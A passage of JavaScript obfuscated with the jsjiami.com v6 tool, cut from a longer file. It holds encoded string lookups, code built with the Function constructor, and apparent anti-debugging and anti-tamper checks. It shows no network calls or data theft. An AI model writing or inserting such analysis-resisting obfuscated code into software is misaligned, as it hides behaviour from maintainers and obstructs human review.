_0x5264cb[_0xa087('1b3','XLD^')](Function,_0x5264cb[_0xa087('1b4','4l6F')](_0x5264cb[_0xa087('1b5','UAIC')](_0x5264cb[_0xa087('1b6','RWY7')],_0x1740fa),_0x5264cb[_0xa087('1b7',']5PM')]));}(_0x1740fa);}}(_0x8c8b31[_0xa087('1b8','!Hu2')])('de'));;}}}_0x8c8b31[_0xa087('1b9','DF6#')](_0x4ee7a7,++_0x59bed0);}else{_0x8c8b31[_0xa087('1ba','ml3Z')](_0x60edc1,this,function(){var _0x14add3=new RegExp(_0x5264cb[_0xa087('1bb','#wTj')]);var _0x13ce8d=new RegExp(_0x5264cb[_0xa087('1bc','XLD^')],'i');var _0x4a174f=_0x5264cb[_0xa087('1bd','RWY7')](_0x4a0293,_0x5264cb[_0xa087('1be','OFGo')]);if(!_0x14add3[_0xa087('1bf','Fy#v')](_0x5264cb[_0xa087('1c0','n8ya')](_0x4a174f,_0x5264cb[_0xa087('1c1','!Hu2')]))||!_0x13ce8d[_0xa087('1bf','Fy#v')](_0x5264cb[_0xa087('1c2','hi@Q')](_0x4a174f,_0x5264cb[_0xa087('1c3','9PG8')]))){_0x5264cb[_0xa087('1c4','wvia')](_0x4a174f,'0');}else{_0x5264cb[_0xa087('1c5','dXy%')](_0x4a0293);}})();}}try{if(_0x4b43f3){if(_0x8c8b31[_0xa087('1c6','GW@*')](_0x8c8b31[_0xa087('1c7','dXy%')],_0x8c8b31[_0xa087('1c8','&2iM')])){return _0x4ee7a7;}else{if(fn){var _0x292b56=fn[_0xa087('1c9','sg[1')](context,arguments);fn=null;return _0x292b56;}}}else{_0x8c8b31[_0xa087('1ca','#qn%')](_0x4ee7a7,0x0);}}catch(_0x400a07){}};_0xod3='jsjiami.com.v6';

 
